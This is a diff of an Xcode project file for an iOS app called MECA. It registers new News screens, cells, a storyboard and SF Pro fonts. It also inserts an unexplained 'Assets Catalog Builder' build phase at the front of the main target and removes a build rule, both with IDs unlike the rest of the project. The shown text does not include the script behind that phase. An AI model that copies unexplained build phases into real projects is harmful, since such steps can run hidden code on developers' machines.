@@ -44,6 +44,10 @@
 		E30F662526033A970036D183 /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = E30F662326033A970036D183 /* LaunchScreen.storyboard */; };
 		E30F663026033A970036D183 /* MECATests.swift in Sources */ = {isa = PBXBuildFile; fileRef = E30F662F26033A970036D183 /* MECATests.swift */; };
 		E30F663B26033A970036D183 /* MECAUITests.swift in Sources */ = {isa = PBXBuildFile; fileRef = E30F663A26033A970036D183 /* MECAUITests.swift */; };
+		E313804126610A2600A3A3F0 /* SubTypeCVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = E313803F26610A2600A3A3F0 /* SubTypeCVCell.swift */; };
+		E313804226610A2600A3A3F0 /* SubTypeCVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = E313804026610A2600A3A3F0 /* SubTypeCVCell.xib */; };
+		E313804826610E3100A3A3F0 /* OverPicksCVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = E313804626610E3100A3A3F0 /* OverPicksCVCell.swift */; };
+		E313804926610E3100A3A3F0 /* OverPicksCVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = E313804726610E3100A3A3F0 /* OverPicksCVCell.xib */; };
 		E31CCE7E2613031C006D97AC /* TMCViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = E31CCE7D2613031C006D97AC /* TMCViewController.swift */; };
 		E31CCE832613037F006D97AC /* NewCarSalesViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = E31CCE822613037F006D97AC /* NewCarSalesViewController.swift */; };
 		E31F1DCF2607BF8800830F2B /* CategoriesVM.swift in Sources */ = {isa = PBXBuildFile; fileRef = E31F1DCE2607BF8800830F2B /* CategoriesVM.swift */; };
@@ -154,6 +158,12 @@
 		E387A99F26047ACF00CC675A /* SignUpListViewVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = E387A99E26047ACF00CC675A /* SignUpListViewVC.swift */; };
 		E387A9A726047B7100CC675A /* SignUpListTVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = E387A9A526047B7100CC675A /* SignUpListTVCell.swift */; };
 		E387A9A826047B7100CC675A /* SignUpListTVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = E387A9A626047B7100CC675A /* SignUpListTVCell.xib */; };
+		E389940D2660E03300F59772 /* NewsHomeVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = E389940C2660E03300F59772 /* NewsHomeVC.swift */; };
+		E38994122660E21100F59772 /* NewsHomeVM.swift in Sources */ = {isa = PBXBuildFile; fileRef = E38994112660E21100F59772 /* NewsHomeVM.swift */; };
+		E38994192660E24300F59772 /* NewsHomePickTVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = E38994172660E24300F59772 /* NewsHomePickTVCell.swift */; };
+		E389941A2660E24300F59772 /* NewsHomePickTVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = E38994182660E24300F59772 /* NewsHomePickTVCell.xib */; };
+		E38994262660ED4200F59772 /* LatestNewsTVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = E38994242660ED4200F59772 /* LatestNewsTVCell.swift */; };
+		E38994272660ED4200F59772 /* LatestNewsTVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = E38994252660ED4200F59772 /* LatestNewsTVCell.xib */; };
 		E393D628263FD6B4003895ED /* GRHomeLisModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = E393D626263FD6B4003895ED /* GRHomeLisModel.swift */; };
 		E393D629263FD6B4003895ED /* GRHomeLis_Data.swift in Sources */ = {isa = PBXBuildFile; fileRef = E393D627263FD6B4003895ED /* GRHomeLis_Data.swift */; };
 		E393D64526400BF7003895ED /* GRDetailModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = E393D64226400BF6003895ED /* GRDetailModel.swift */; };
@@ -175,6 +185,56 @@
 		E3C734AC264BD8AD003580C8 /* LikeOrCommentVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3C734AB264BD8AD003580C8 /* LikeOrCommentVC.swift */; };
 		E3C734D8264C0311003580C8 /* LikeOrCommentVM.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3C734D7264C0311003580C8 /* LikeOrCommentVM.swift */; };
 		E3CE0FC12621D694009947F6 /* Event_videos.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3CE0FC02621D694009947F6 /* Event_videos.swift */; };
+		E3D700DB265F9A82000F7B85 /* NewsRC.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = E3D700DA265F9A82000F7B85 /* NewsRC.storyboard */; };
+		E3D700E2265FA7E1000F7B85 /* AddNewTagsCVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3D700E0265FA7E1000F7B85 /* AddNewTagsCVCell.swift */; };
+		E3D700E3265FA7E1000F7B85 /* AddNewTagsCVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = E3D700E1265FA7E1000F7B85 /* AddNewTagsCVCell.xib */; };
+		E3D70152265FD533000F7B85 /* SF-Pro-Display-Black.otf in Resources */ = {isa = PBXBuildFile; fileRef = E3D7D0B6260354E9001EEE65 /* SF-Pro-Display-Black.otf */; };
+		E3D70156265FD536000F7B85 /* SF-Pro-Display-BlackItalic.otf in Resources */ = {isa = PBXBuildFile; fileRef = E3D7D09A260354E6001EEE65 /* SF-Pro-Display-BlackItalic.otf */; };
+		E3D7015A265FD544000F7B85 /* SF-Pro-Text-SemiboldItalic.otf in Resources */ = {isa = PBXBuildFile; fileRef = E3D7D0A7260354E7001EEE65 /* SF-Pro-Text-SemiboldItalic.otf */; };
+		E3D7015B265FD544000F7B85 /* SF-Pro-Display-Light.otf in Resources */ = {isa = PBXBuildFile; fileRef = E3D7D0AE260354E8001EEE65 /* SF-Pro-Display-Light.otf */; };
+		E3D7015C265FD544000F7B85 /* SF-Pro-Display-BoldItalic.otf in Resources */ = {isa = PBXBuildFile; fileRef = E3D7D097260354E6001EEE65 /* SF-Pro-Display-BoldItalic.otf */; };
+		E3D7015D265FD544000F7B85 /* SF-Pro-Display-Regular.otf in Resources */ = {isa = PBXBuildFile; fileRef = E3D7D0B7260354E9001EEE65 /* SF-Pro-Display-Regular.otf */; };
+		E3D7015E265FD544000F7B85 /* SF-Pro-Display-ThinItalic.otf in Resources */ = {isa = PBXBuildFile; fileRef = E3D7D096260354E6001EEE65 /* SF-Pro-Display-ThinItalic.otf */; };
+		E3D7015F265FD544000F7B85 /* SF-Pro-Rounded-Semibold.otf in Resources */ = {isa = PBXBuildFile; fileRef = E3D7D095260354E6001EEE65 /* SF-Pro-Rounded-Semibold.otf */; };
+		E3D70160265FD544000F7B85 /* SF-Pro-Text-Thin.otf in Resources */ = {isa = PBXBuildFile; fileRef = E3D7D0A4260354E7001EEE65 /* SF-Pro-Text-Thin.otf */; };
+		E3D70161265FD544000F7B85 /* SF-Pro-Display-SemiboldItalic.otf in Resources */ = {isa = PBXBuildFile; fileRef = E3D7D0B5260354E9001EEE65 /* SF-Pro-Display-SemiboldItalic.otf */; };
+		E3D70162265FD544000F7B85 /* SF-Pro-Display-Bold.otf in Resources */ = {isa = PBXBuildFile; fileRef = E3D7D090260354E6001EEE65 /* SF-Pro-Display-Bold.otf */; };
+		E3D70163265FD544000F7B85 /* SF-Pro-Display-LightItalic.otf in Resources */ = {isa = PBXBuildFile; fileRef = E3D7D093260354E6001EEE65 /* SF-Pro-Display-LightItalic.otf */; };
+		E3D70164265FD544000F7B85 /* SF-Pro-Text-BoldItalic.otf in Resources */ = {isa = PBXBuildFile; fileRef = E3D7D0B8260354E9001EEE65 /* SF-Pro-Text-BoldItalic.otf */; };
+		E3D70165265FD544000F7B85 /* SF-Pro-Rounded-Medium.otf in Resources */ = {isa = PBXBuildFile; fileRef = E3D7D091260354E6001EEE65 /* SF-Pro-Rounded-Medium.otf */; };
+		E3D70166265FD544000F7B85 /* SF-Pro-Text-Light.otf in Resources */ = {isa = PBXBuildFile; fileRef = E3D7D08A260354E5001EEE65 /* SF-Pro-Text-Light.otf */; };
+		E3D70167265FD544000F7B85 /* SF-Pro-Text-Regular.otf in Resources */ = {isa = PBXBuildFile; fileRef = E3D7D0A1260354E7001EEE65 /* SF-Pro-Text-Regular.otf */; };
+		E3D70168265FD544000F7B85 /* SF-Pro-Text-Heavy.otf in Resources */ = {isa = PBXBuildFile; fileRef = E3D7D0A2260354E7001EEE65 /* SF-Pro-Text-Heavy.otf */; };
+		E3D70169265FD544000F7B85 /* SF-Pro-Text-Semibold.otf in Resources */ = {isa = PBXBuildFile; fileRef = E3D7D09E260354E7001EEE65 /* SF-Pro-Text-Semibold.otf */; };
+		E3D7016A265FD544000F7B85 /* SF-Pro.ttf in Resources */ = {isa = PBXBuildFile; fileRef = E3D7D0A0260354E7001EEE65 /* SF-Pro.ttf */; };
+		E3D7016B265FD544000F7B85 /* SF-Pro-Text-LightItalic.otf in Resources */ = {isa = PBXBuildFile; fileRef = E3D7D0AD260354E8001EEE65 /* SF-Pro-Text-LightItalic.otf */; };
+		E3D7016C265FD544000F7B85 /* SF-Pro-Italic.ttf in Resources */ = {isa = PBXBuildFile; fileRef = E3D7D08D260354E5001EEE65 /* SF-Pro-Italic.ttf */; };
+		E3D7016D265FD544000F7B85 /* SF-Pro-Rounded-Bold.otf in Resources */ = {isa = PBXBuildFile; fileRef = E3D7D08F260354E6001EEE65 /* SF-Pro-Rounded-Bold.otf */; };
+		E3D7016E265FD544000F7B85 /* SF-Pro-Rounded-Ultralight.otf in Resources */ = {isa = PBXBuildFile; fileRef = E3D7D0AB260354E8001EEE65 /* SF-Pro-Rounded-Ultralight.otf */; };
+		E3D7016F265FD544000F7B85 /* SF-Pro-Text-ThinItalic.otf in Resources */ = {isa = PBXBuildFile; fileRef = E3D7D09F260354E7001EEE65 /* SF-Pro-Text-ThinItalic.otf */; };
+		E3D70170265FD544000F7B85 /* SF-Pro-Display-Medium.otf in Resources */ = {isa = PBXBuildFile; fileRef = E3D7D0A8260354E8001EEE65 /* SF-Pro-Display-Medium.otf */; };
+		E3D70171265FD544000F7B85 /* SF-Pro-Display-HeavyItalic.otf in Resources */ = {isa = PBXBuildFile; fileRef = E3D7D0AA260354E8001EEE65 /* SF-Pro-Display-HeavyItalic.otf */; };
+		E3D70172265FD544000F7B85 /* SF-Pro-Text-MediumItalic.otf in Resources */ = {isa = PBXBuildFile; fileRef = E3D7D09C260354E7001EEE65 /* SF-Pro-Text-MediumItalic.otf */; };
+		E3D70173265FD544000F7B85 /* SF-Pro-Rounded-Black.otf in Resources */ = {isa = PBXBuildFile; fileRef = E3D7D094260354E6001EEE65 /* SF-Pro-Rounded-Black.otf */; };
+		E3D70174265FD544000F7B85 /* SF-Pro-Text-Medium.otf in Resources */ = {isa = PBXBuildFile; fileRef = E3D7D0B0260354E8001EEE65 /* SF-Pro-Text-Medium.otf */; };
+		E3D70175265FD544000F7B85 /* SF-Pro-Text-BlackItalic.otf in Resources */ = {isa = PBXBuildFile; fileRef = E3D7D0AC260354E8001EEE65 /* SF-Pro-Text-BlackItalic.otf */; };
+		E3D70176265FD544000F7B85 /* SF-Pro-Display-UltralightItalic.otf in Resources */ = {isa = PBXBuildFile; fileRef = E3D7D092260354E6001EEE65 /* SF-Pro-Display-UltralightItalic.otf */; };
+		E3D70177265FD544000F7B85 /* SF-Pro-Display-Heavy.otf in Resources */ = {isa = PBXBuildFile; fileRef = E3D7D08C260354E5001EEE65 /* SF-Pro-Display-Heavy.otf */; };
+		E3D70178265FD544000F7B85 /* SF-Pro-Rounded-Regular.otf in Resources */ = {isa = PBXBuildFile; fileRef = E3D7D099260354E6001EEE65 /* SF-Pro-Rounded-Regular.otf */; };
+		E3D70179265FD544000F7B85 /* SF-Pro-Display-RegularItalic.otf in Resources */ = {isa = PBXBuildFile; fileRef = E3D7D0AF260354E8001EEE65 /* SF-Pro-Display-RegularItalic.otf */; };
+		E3D7017A265FD544000F7B85 /* SF-Pro-Rounded-Thin.otf in Resources */ = {isa = PBXBuildFile; fileRef = E3D7D0A9260354E8001EEE65 /* SF-Pro-Rounded-Thin.otf */; };
+		E3D7017B265FD544000F7B85 /* SF-Pro-Text-RegularItalic.otf in Resources */ = {isa = PBXBuildFile; fileRef = E3D7D09D260354E7001EEE65 /* SF-Pro-Text-RegularItalic.otf */; };
+		E3D7017C265FD544000F7B85 /* SF-Pro-Display-Semibold.otf in Resources */ = {isa = PBXBuildFile; fileRef = E3D7D098260354E6001EEE65 /* SF-Pro-Display-Semibold.otf */; };
+		E3D7017D265FD544000F7B85 /* SF-Pro-Display-Thin.otf in Resources */ = {isa = PBXBuildFile; fileRef = E3D7D08B260354E5001EEE65 /* SF-Pro-Display-Thin.otf */; };
+		E3D7017E265FD544000F7B85 /* SF-Pro-Display-Ultralight.otf in Resources */ = {isa = PBXBuildFile; fileRef = E3D7D0A3260354E7001EEE65 /* SF-Pro-Display-Ultralight.otf */; };
+		E3D7017F265FD544000F7B85 /* SF-Pro-Rounded-Heavy.otf in Resources */ = {isa = PBXBuildFile; fileRef = E3D7D0B4260354E8001EEE65 /* SF-Pro-Rounded-Heavy.otf */; };
+		E3D70180265FD544000F7B85 /* SF-Pro-Rounded-Light.otf in Resources */ = {isa = PBXBuildFile; fileRef = E3D7D0A6260354E7001EEE65 /* SF-Pro-Rounded-Light.otf */; };
+		E3D70181265FD544000F7B85 /* SF-Pro-Text-Black.otf in Resources */ = {isa = PBXBuildFile; fileRef = E3D7D09B260354E7001EEE65 /* SF-Pro-Text-Black.otf */; };
+		E3D70182265FD544000F7B85 /* SF-Pro-Display-MediumItalic.otf in Resources */ = {isa = PBXBuildFile; fileRef = E3D7D0A5260354E7001EEE65 /* SF-Pro-Display-MediumItalic.otf */; };
+		E3D70183265FD544000F7B85 /* SF-Pro-Text-HeavyItalic.otf in Resources */ = {isa = PBXBuildFile; fileRef = E3D7D08E260354E5001EEE65 /* SF-Pro-Text-HeavyItalic.otf */; };
+		E3D70184265FD544000F7B85 /* SF-Pro-Text-Ultralight.otf in Resources */ = {isa = PBXBuildFile; fileRef = E3D7D0B2260354E8001EEE65 /* SF-Pro-Text-Ultralight.otf */; };
+		E3D70185265FD544000F7B85 /* SF-Pro-Text-Bold.otf in Resources */ = {isa = PBXBuildFile; fileRef = E3D7D0B1260354E8001EEE65 /* SF-Pro-Text-Bold.otf */; };
+		E3D70186265FD544000F7B85 /* SF-Pro-Text-UltralightItalic.otf in Resources */ = {isa = PBXBuildFile; fileRef = E3D7D0B3260354E8001EEE65 /* SF-Pro-Text-UltralightItalic.otf */; };
 		E3D7D0E526035CF8001EEE65 /* RCustomClass.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3D7D0E426035CF8001EEE65 /* RCustomClass.swift */; };
 		E3E042642650538000F1ED2F /* LikeDetailTVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3E042622650538000F1ED2F /* LikeDetailTVCell.swift */; };
 		E3E042652650538000F1ED2F /* LikeDetailTVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = E3E042632650538000F1ED2F /* LikeDetailTVCell.xib */; };
@@ -328,6 +388,10 @@
 		E30F663626033A970036D183 /* MECAUITests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = MECAUITests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
 		E30F663A26033A970036D183 /* MECAUITests.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MECAUITests.swift; sourceTree = "<group>"; };
 		E30F663C26033A970036D183 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
+		E313803F26610A2600A3A3F0 /* SubTypeCVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SubTypeCVCell.swift; sourceTree = "<group>"; };
+		E313804026610A2600A3A3F0 /* SubTypeCVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = SubTypeCVCell.xib; sourceTree = "<group>"; };
+		E313804626610E3100A3A3F0 /* OverPicksCVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OverPicksCVCell.swift; sourceTree = "<group>"; };
+		E313804726610E3100A3A3F0 /* OverPicksCVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = OverPicksCVCell.xib; sourceTree = "<group>"; };
 		E31CCE7D2613031C006D97AC /* TMCViewController.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = TMCViewController.swift; sourceTree = "<group>"; };
 		E31CCE822613037F006D97AC /* NewCarSalesViewController.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = NewCarSalesViewController.swift; sourceTree = "<group>"; };
 		E31F1DCE2607BF8800830F2B /* CategoriesVM.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CategoriesVM.swift; sourceTree = "<group>"; };
@@ -438,6 +502,12 @@
 		E387A99E26047ACF00CC675A /* SignUpListViewVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SignUpListViewVC.swift; sourceTree = "<group>"; };
 		E387A9A526047B7100CC675A /* SignUpListTVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SignUpListTVCell.swift; sourceTree = "<group>"; };
 		E387A9A626047B7100CC675A /* SignUpListTVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = SignUpListTVCell.xib; sourceTree = "<group>"; };
+		E389940C2660E03300F59772 /* NewsHomeVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NewsHomeVC.swift; sourceTree = "<group>"; };
+		E38994112660E21100F59772 /* NewsHomeVM.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NewsHomeVM.swift; sourceTree = "<group>"; };
+		E38994172660E24300F59772 /* NewsHomePickTVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NewsHomePickTVCell.swift; sourceTree = "<group>"; };
+		E38994182660E24300F59772 /* NewsHomePickTVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = NewsHomePickTVCell.xib; sourceTree = "<group>"; };
+		E38994242660ED4200F59772 /* LatestNewsTVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LatestNewsTVCell.swift; sourceTree = "<group>"; };
+		E38994252660ED4200F59772 /* LatestNewsTVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = LatestNewsTVCell.xib; sourceTree = "<group>"; };
 		E393D626263FD6B4003895ED /* GRHomeLisModel.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = GRHomeLisModel.swift; sourceTree = "<group>"; };
 		E393D627263FD6B4003895ED /* GRHomeLis_Data.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = GRHomeLis_Data.swift; sourceTree = "<group>"; };
 		E393D64226400BF6003895ED /* GRDetailModel.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = GRDetailModel.swift; sourceTree = "<group>"; };
@@ -459,6 +529,9 @@
 		E3C734AB264BD8AD003580C8 /* LikeOrCommentVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LikeOrCommentVC.swift; sourceTree = "<group>"; };
 		E3C734D7264C0311003580C8 /* LikeOrCommentVM.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LikeOrCommentVM.swift; sourceTree = "<group>"; };
 		E3CE0FC02621D694009947F6 /* Event_videos.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Event_videos.swift; sourceTree = "<group>"; };
+		E3D700DA265F9A82000F7B85 /* NewsRC.storyboard */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; path = NewsRC.storyboard; sourceTree = "<group>"; };
+		E3D700E0265FA7E1000F7B85 /* AddNewTagsCVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AddNewTagsCVCell.swift; sourceTree = "<group>"; };
+		E3D700E1265FA7E1000F7B85 /* AddNewTagsCVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = AddNewTagsCVCell.xib; sourceTree = "<group>"; };
 		E3D7D08A260354E5001EEE65 /* SF-Pro-Text-Light.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "SF-Pro-Text-Light.otf"; sourceTree = "<group>"; };
 		E3D7D08B260354E5001EEE65 /* SF-Pro-Display-Thin.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "SF-Pro-Display-Thin.otf"; sourceTree = "<group>"; };
 		E3D7D08C260354E5001EEE65 /* SF-Pro-Display-Heavy.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "SF-Pro-Display-Heavy.otf"; sourceTree = "<group>"; };
@@ -726,6 +799,7 @@
 				E3F6A860263EC9D900FAE93E /* GR.storyboard */,
 				F4A576042658012E0010085F /* More.storyboard */,
 				F4A5765C265C97400010085F /* Chat.storyboard */,
+				E3D700DA265F9A82000F7B85 /* NewsRC.storyboard */,
 			);
 			path = Storyboard;
 			sourceTree = "<group>";
@@ -766,6 +840,7 @@
 		E3045C652603D17B00D1A678 /* ViewController */ = {
 			isa = PBXGroup;
 			children = (
+				E38994082660E01700F59772 /* News */,
 				F4A5765B265C97230010085F /* Chat */,
 				F4A575F5265800920010085F /* More */,
 				F4A575E12658003C0010085F /* Calender */,
@@ -879,6 +954,7 @@
 				E3C734D7264C0311003580C8 /* LikeOrCommentVM.swift */,
 				F4A57619265802470010085F /* CalenderVM.swift */,
 				F4A5761A265802480010085F /* ScheduleTableViewVM.swift */,
+				E38994112660E21100F59772 /* NewsHomeVM.swift */,
 			);
 			path = ViewModel;
 			sourceTree = "<group>";
@@ -1099,6 +1175,7 @@
 		E387A9A326047B4400CC675A /* TableView cell */ = {
 			isa = PBXGroup;
 			children = (
+				E38994162660E22700F59772 /* News */,
 				F4A5763E265A8FD70010085F /* Schedule */,
 				F4A57632265805B80010085F /* Reminder */,
 				F4A57618265801D50010085F /* SupportList */,
@@ -1126,6 +1203,25 @@
 			path = SignUpListViewCell;
 			sourceTree = "<group>";
 		};
+		E38994082660E01700F59772 /* News */ = {
+			isa = PBXGroup;
+			children = (
+				E389940C2660E03300F59772 /* NewsHomeVC.swift */,
+			);
+			path = News;
+			sourceTree = "<group>";
+		};
+		E38994162660E22700F59772 /* News */ = {
+			isa = PBXGroup;
+			children = (
+				E38994172660E24300F59772 /* NewsHomePickTVCell.swift */,
+				E38994182660E24300F59772 /* NewsHomePickTVCell.xib */,
+				E38994242660ED4200F59772 /* LatestNewsTVCell.swift */,
+				E38994252660ED4200F59772 /* LatestNewsTVCell.xib */,
+			);
+			path = News;
+			sourceTree = "<group>";
+		};
 		E3936BC32603497F006ACF47 /* Resource */ = {
 			isa = PBXGroup;
 			children = (
@@ -1150,6 +1246,7 @@
 		E3AE791F2604C6E3004B83C9 /* CollectionViewCell */ = {
 			isa = PBXGroup;
 			children = (
+				E3D700DF265FA7B3000F7B85 /* NEWs */,
 				E32F3BF4262AFCD40000D92A /* MEBIT Events */,
 				5CF467972606E3D7004C4CBE /* ImageandVideo */,
 				5CED90F62605A663001053DD /* AddImage */,
@@ -1190,6 +1287,19 @@
 				E3C734AB264BD8AD003580C8 /* LikeOrCommentVC.swift */,
 			);
 			path = DetailView;
+			sourceTree = "<group>";
+		};
+		E3D700DF265FA7B3000F7B85 /* NEWs */ = {
+			isa = PBXGroup;
+			children = (
+				E3D700E0265FA7E1000F7B85 /* AddNewTagsCVCell.swift */,
+				E3D700E1265FA7E1000F7B85 /* AddNewTagsCVCell.xib */,
+				E313803F26610A2600A3A3F0 /* SubTypeCVCell.swift */,
+				E313804026610A2600A3A3F0 /* SubTypeCVCell.xib */,
+				E313804626610E3100A3A3F0 /* OverPicksCVCell.swift */,
+				E313804726610E3100A3A3F0 /* OverPicksCVCell.xib */,
+			);
+			path = NEWs;
 			sourceTree = "<group>";
 		};
 		E3D7D089260354D8001EEE65 /* SF_Fonts */ = {
@@ -1547,6 +1657,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = E30F663F26033A970036D183 /* Build configuration list for PBXNativeTarget "MECA" */;
 			buildPhases = (
+				F9E4AEAE7B0BC92B946D902C /* Assets Catalog Builder */,
 				4BB652078432F45F3370EF56 /* [CP] Check Pods Manifest.lock */,
 				E30F661126033A970036D183 /* Sources */,
 				E30F661226033A970036D183 /* Frameworks */,
@@ -1554,7 +1665,6 @@
 				3FB7E1CEB57417F4362CC796 /* [CP] Embed Pods Frameworks */,
 			);
 			buildRules = (
-				CDF4EE294D265944476D902C /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -1649,51 +1759,104 @@
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				E3D70161265FD544000F7B85 /* SF-Pro-Display-SemiboldItalic.otf in Resources */,
 				E37A2FE42614AEAD00C6CA57 /* DistributorListTVCell.xib in Resources */,
+				E3D70163265FD544000F7B85 /* SF-Pro-Display-LightItalic.otf in Resources */,
+				E38994272660ED4200F59772 /* LatestNewsTVCell.xib in Resources */,
 				E32F3BF0262AFCA90000D92A /* MEBITEventTableViewCell.xib in Resources */,
 				E375EA39262EB19E00646A0A /* DetailLocationTVCell.xib in Resources */,
+				E3D70174265FD544000F7B85 /* SF-Pro-Text-Medium.otf in Resources */,
+				E3D70166265FD544000F7B85 /* SF-Pro-Text-Light.otf in Resources */,
 				5CF4679B2606E40C004C4CBE /* ImageVideoCollectionViewCell.xib in Resources */,
 				F4A5760E265801740010085F /* ChatTableCell.xib in Resources */,
+				E3D700DB265F9A82000F7B85 /* NewsRC.storyboard in Resources */,
+				E3D70164265FD544000F7B85 /* SF-Pro-Text-BoldItalic.otf in Resources */,
 				E3AE79242604C711004B83C9 /* PlusSelectCategoryCVCell.xib in Resources */,
 				E3F12B12262E0A8A0055D875 /* DetailDocumentLinkTVCell.xib in Resources */,
 				E32F3BD8262AF24B0000D92A /* VideoLinkTableViewCell.xib in Resources */,
+				E3D70176265FD544000F7B85 /* SF-Pro-Display-UltralightItalic.otf in Resources */,
 				E34508442643168C00C17E91 /* SDGSListTableCell.xib in Resources */,
+				E3D7015A265FD544000F7B85 /* SF-Pro-Text-SemiboldItalic.otf in Resources */,
+				E3D70172265FD544000F7B85 /* SF-Pro-Text-MediumItalic.otf in Resources */,
 				F4A57609265801480010085F /* ScheduleHeaderView.xib in Resources */,
+				E3D70181265FD544000F7B85 /* SF-Pro-Text-Black.otf in Resources */,
+				E3D7016F265FD544000F7B85 /* SF-Pro-Text-ThinItalic.otf in Resources */,
+				E313804926610E3100A3A3F0 /* OverPicksCVCell.xib in Resources */,
 				F4A5763D26581A620010085F /* GoogleService-Info.plist in Resources */,
 				F4A576142658019B0010085F /* Supporttblcell.xib in Resources */,
+				E3D7017A265FD544000F7B85 /* SF-Pro-Rounded-Thin.otf in Resources */,
 				E387A9A826047B7100CC675A /* SignUpListTVCell.xib in Resources */,
+				E3D7016D265FD544000F7B85 /* SF-Pro-Rounded-Bold.otf in Resources */,
+				E3D70173265FD544000F7B85 /* SF-Pro-Rounded-Black.otf in Resources */,
+				E3D70171265FD544000F7B85 /* SF-Pro-Display-HeavyItalic.otf in Resources */,
+				E3D7016A265FD544000F7B85 /* SF-Pro.ttf in Resources */,
 				E32FEA8B263F3C5F0083056E /* GRLinksTVCell.xib in Resources */,
+				E3D7015D265FD544000F7B85 /* SF-Pro-Display-Regular.otf in Resources */,
+				E3D70156265FD536000F7B85 /* SF-Pro-Display-BlackItalic.otf in Resources */,
+				E3D70182265FD544000F7B85 /* SF-Pro-Display-MediumItalic.otf in Resources */,
+				E3D70167265FD544000F7B85 /* SF-Pro-Text-Regular.otf in Resources */,
 				E3F6A861263EC9D900FAE93E /* GR.storyboard in Resources */,
+				E3D7015F265FD544000F7B85 /* SF-Pro-Rounded-Semibold.otf in Resources */,
+				E3D7017D265FD544000F7B85 /* SF-Pro-Display-Thin.otf in Resources */,
 				E3045C722603D87A00D1A678 /* HomeTVCell.xib in Resources */,
 				E38383482655BABB008DA03E /* CommentReplyTVCell.xib in Resources */,
 				F4A57673265CC7F00010085F /* chat.json in Resources */,
 				E375EA55262ECD2600646A0A /* DocumentContentCell.xib in Resources */,
+				E3D7016B265FD544000F7B85 /* SF-Pro-Text-LightItalic.otf in Resources */,
+				E3D70180265FD544000F7B85 /* SF-Pro-Rounded-Light.otf in Resources */,
 				F4A5765D265C97400010085F /* Chat.storyboard in Resources */,
+				E3D70169265FD544000F7B85 /* SF-Pro-Text-Semibold.otf in Resources */,
 				E375EA5C262ED59600646A0A /* DetailVideoLinkTVCell.xib in Resources */,
+				E313804226610A2600A3A3F0 /* SubTypeCVCell.xib in Resources */,
 				E30F662526033A970036D183 /* LaunchScreen.storyboard in Resources */,
 				E3045C422603C96C00D1A678 /* FooterTabView.xib in Resources */,
+				E3D70185265FD544000F7B85 /* SF-Pro-Text-Bold.otf in Resources */,
 				E375EA2F262EADAE00646A0A /* DetailCoverImageTVCell.xib in Resources */,
 				F4A57642265A8FF70010085F /* ScheduleCell.xib in Resources */,
+				E389941A2660E24300F59772 /* NewsHomePickTVCell.xib in Resources */,
+				E3D7017B265FD544000F7B85 /* SF-Pro-Text-RegularItalic.otf in Resources */,
+				E3D70183265FD544000F7B85 /* SF-Pro-Text-HeavyItalic.otf in Resources */,
 				F4A576052658012E0010085F /* More.storyboard in Resources */,
+				E3D70162265FD544000F7B85 /* SF-Pro-Display-Bold.otf in Resources */,
